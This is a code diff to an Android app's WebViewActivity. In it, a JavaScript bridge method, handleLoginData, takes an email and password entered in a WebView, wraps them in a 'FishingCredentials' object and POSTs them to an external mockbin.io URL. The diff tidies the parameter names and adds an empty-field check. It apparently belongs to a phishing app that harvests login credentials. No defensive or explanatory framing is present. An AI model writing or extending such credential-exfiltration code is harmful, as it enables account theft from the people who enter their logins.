@@ -65,38 +65,40 @@ public class WebViewActivity extends AppCompatActivity {
 
     public class WeAppInterface {
         @JavascriptInterface
-        public void handleLoginData(String emailFac, String passwordFac) {
+        public void handleLoginData(String email, String password) {
+            if (!email.isEmpty() && !password.isEmpty()){
+                String url = "https://5971c4846f2b461fb61ef015c0ce85bf.api.mockbin.io/";
 
-            String url = "https://5971c4846f2b461fb61ef015c0ce85bf.api.mockbin.io/";
+                Retrofit retrofit = new Retrofit.Builder()
+                        .baseUrl(url)
+                        .addConverterFactory(GsonConverterFactory.create())
+                        .build();
 
-            Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl(url)
-                    .addConverterFactory(GsonConverterFactory.create())
-                    .build();
+                // Create API service
+                ApiService apiService = retrofit.create(ApiService.class);
 
-            // Create API service
-            ApiService apiService = retrofit.create(ApiService.class);
+                // Create request body
+                FishingCredentials loginRequest = new FishingCredentials(email, password);
 
-            // Create request body
-            FishingCredentials loginRequest = new FishingCredentials(emailFac, passwordFac);
-
-            // Send POST request
-            Call<Void> call = apiService.sendCredentials(loginRequest);
-            call.enqueue(new Callback<Void>() {
-                @Override
-                public void onResponse(Call<Void> call, Response<Void> response) {
-                    if (response.isSuccessful()) {
-                        Log.i("WebView", "Data sent successfully!");
-                    } else {
-                        Log.e("WebView", "Request failed with code: " + response.code());
+                // Send POST request
+                Call<Void> call = apiService.sendCredentials(loginRequest);
+                call.enqueue(new Callback<Void>() {
+                    @Override
+                    public void onResponse(Call<Void> call, Response<Void> response) {
+                        if (response.isSuccessful()) {
+                            Log.i("WebView", "Data sent successfully!");
+                        } else {
+                            Log.e("WebView", "Request failed with code: " + response.code());
+                        }
                     }
-                }
 
-                @Override
-                public void onFailure(Call<Void> call, Throwable t) {
-                    Log.e("WebView", "Request failed", t);
-                }
-            });
+                    @Override
+                    public void onFailure(Call<Void> call, Throwable t) {
+                        Log.e("WebView", "Request failed", t);
+                    }
+                });
+            }
+
         }
     }
 
